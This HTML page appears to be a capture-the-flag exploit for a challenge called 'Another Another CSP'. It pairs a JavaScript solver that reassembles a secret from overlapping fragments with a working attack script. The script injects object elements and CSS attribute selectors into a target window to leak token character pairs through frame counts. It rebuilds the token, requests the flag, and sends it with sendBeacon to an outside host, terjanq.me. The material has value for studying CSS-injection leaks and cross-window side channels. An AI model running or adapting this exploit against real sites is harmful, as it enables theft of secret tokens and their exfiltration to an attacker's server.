<html>

<head>
    <meta charset="utf-8">
    <title>Solver | Another Another CSP</title>
    <script>
        function solve(puzzles, secret_size, settings = {}) {
            if (!puzzles || puzzles.length === 0) {
                throw "No puzzles provided!"
            }
            if (typeof puzzles === "string") {
                var delimeter = settings.delimeter || ',';
                puzzles = puzzles.trim().split(delimeter)
            }

            /*
                Optimization possible: improve withDuplicates so the assemblies do not repeat
            */

            if (!settings.withDuplicates) {
                // remove duplicates
                puzzles = puzzles = Array.from(new Set(puzzles))
            }

            if (settings.shuffle) {
                shuffleArray(puzzles)
            }

            // debugging information
            const debug_info = [];

            // size of single puzzle
            const puzzle_size = puzzles[0].length;

            if (puzzle_size <= 1) {
                throw "Puzzle size must be greater than 1";
            }
            // the maximum number of puzzles that may occur in a solution
            const max_puzzles = secret_size - puzzle_size + 1;
            // the number of provided puzzles
            const puzzles_number = puzzles.length;
            // number of maximum repetition of all puzzles in a solution
            const max_repetitions = typeof settings.maxRepetitions !== 'number' ?
                max_puzzles - puzzles_number : settings.maxRepetitions;

            // graph of chains; stores information which puzzles can be combined whith which
            const GRAPH = {};
            // partial solutions for each length Array[N][]
            const SOLUTIONS_DP = Array.from({ length: max_puzzles }).map(_ => []);
            // rules that the solution must satisfy
            const HINTS = settings.hints || [];

            // if fullKnowledge is true, store only last two DP states, otherwise store all
            const FULL_KNOWLEDGE = settings.fullKnowledge;

            class Node {
                constructor(puzzles = [], rep = 0) {
                    // assembly puzzles
                    this.puzzles = puzzles;
                    // number of repetitions
                    this.repititions = rep;
                }

                _debug() {
                    return `word: ${this.toString()}\nrepitions: ${this.repititions}`
                }
                // top puzzle
                get top() {
                    if (!this.puzzles.length) return undefined;
                    return this.puzzles[this.puzzles.length - 1];
                }
                // join puzzles
                toString() {
                    let pstr = this.puzzles.slice(0, -1).map(x => puzzles[x][0]).join('')
                    pstr += puzzles[this.top]
                    return pstr
                }

                // add the puzzle to the node and return a new node
                add(i) {
                    let rep = this.repititions;
                    if (this.puzzles.includes(i)) {
                        rep += 1;
                    }
                    // if we reach max_repetitions we want to return false
                    if (rep > max_repetitions) {
                        return false;
                    }
                    return new Node(this.puzzles.concat(i), rep)
                }
            }

            // fill chain graph
            for (let i = 0; i < puzzles_number; i++) {
                GRAPH[i] = [];
                for (let j = 0; j < puzzles_number; j++) {
                    // add to graph if A[1:] == B[:-1]
                    if (puzzles[j].slice(0, -1) === puzzles[i].slice(1)) {
                        GRAPH[i].push(j);
                    }
                }
            }

            // Add all puzzles of size 1 as DP[0]
            for (let i = 0; i < puzzles_number; i++) {
                SOLUTIONS_DP[0].push(new Node([i]))
            }


            const threads = 1;

            /*
             *  Possible optimization: 
             *  Implement Shared Array and threads to optimize memory and execution time.
             */

            if (FULL_KNOWLEDGE) {
                // iterate over all possible states
                for (let I = 1; I < max_puzzles; I++) {
                    // DP[I] = DP[I-1] + DP[0]
                    for (let node of SOLUTIONS_DP[I - 1]) {
                        // iterate over only puzzles that can extend the assembly
                        for (let val of GRAPH[node.top]) {
                            // try to extend the node, if fails repetitions were exceeded
                            let new_node = node.add(val)
                            if (new_node) {
                                SOLUTIONS_DP[I].push(new_node)
                            }
                        }
                    }
                }
            }
            else {
                var prev = SOLUTIONS_DP[0];
                var cur = [];
                // iterate over all possible states
                for (let I = 1; I < max_puzzles; I++) {
                    // clear cur array
                    cur = [];

                    // iterate over previous state
                    for (let node of prev) {
                        // try to extend the assembly
                        for (let val of GRAPH[node.top]) {
                            // if extended successdully, add to the curent state
                            let new_node = node.add(val)
                            if (new_node) {
                                cur.push(new_node)
                            }
                        }
                    }

                    // if there are no more assemblies to extend, finish the loop.
                    if (cur.length === 0) {
                        break;
                    }

                    // assign current state to the previous and delete clear current state
                    prev = cur;
                }
            }


            function parse_solutions(arr) {
                // parsse solutions to strings
                let solutions = arr.map(x => x.toString())

                // filter out solutions, must include hints
                // hints could be also used to improve efficiency of the algorithms TODO
                const filter_hints = (str, pattern) => {
                    if (pattern.constructor === RegExp) {
                        return pattern.test(str);
                    }
                    if (pattern.constructor === Array) {
                        return pattern.some(x => filter_hints(str, x));
                    }
                    return str.includes(pattern);
                }
                solutions = solutions.filter(x => HINTS.every(y => filter_hints(x, y)))

                // remove duplicates if withDuplicates was set because they may be
                // duplicates
                if (settings.withDuplicates) {
                    solutions = Array.from(new Set(solutions))
                }

                return solutions

            }


            if (FULL_KNOWLEDGE) {
                let solutions = parse_solutions(SOLUTIONS_DP[max_puzzles - 1]);

                // if solutions were not found try to find the longest matches
                if (settings.bestMatch && solutions.length == 0) {
                    let i = max_puzzles - 2;
                    while (solutions.length == 0 && i >= 0) {
                        solutions = parse_solutions(SOLUTIONS_DP[i]);
                        i--;
                    }
                }
                return solutions
            }


            if (cur.length === 0 && settings.bestMatch) {
                return parse_solutions(prev);
            } else {
                return parse_solutions(cur);
            }

            return solutions;
        }
    </script>
</head>

<body>
    <script>
        const chalUrl = 'http://localhost'

        const alph = '0123456789abcdefghijklmnopqrstuvwxyz'.split('');
        const pairs = [];

        let code = '<style>object{display:none}</style>\n';
        for (let c1 of alph) {
            for (let c2 of alph) {
                pairs.push(c1 + c2);
            }
        }
        for (let pair of pairs) {
            code += `<object name=w${pair} data=about:blank></object>`;
        }
        code += `<style>`;
        for (let pair of pairs) {
            code += `[data-token*="${pair}"]~[name="w${pair}"]{display:block}\n`
        }
        code += `</style>`;
        var win;
        const sleep = d => new Promise(r => setTimeout(r, d));
        (async function () {
            win = open(chalUrl);
            await sleep(1000);
            win.postMessage({ code }, '*');
            await sleep(2000);

            const found = [];
            for (let pair of pairs) {
                try {
                    win[0]['w' + pair];
                    found.push(pair);
                } catch (e) { }
            }
            window._found = found;
            console.log(found);
           
            window.onmessage = e => {
                console.log(e.data);
                if(e.data.flag !== undefined){
                    navigator.sendBeacon('http://terjanq.me:19999/', e.data.flag);
                }
            }
            const solutions = solve(found, 31);
            console.log(solutions);
            solutions.forEach(e=>{win.postMessage({get_flag:1, token:e}, '*')});
        })();

    </script>
    <img src="https://terjanq.me/stall.php?t=10&noinstant">
</body>

</html>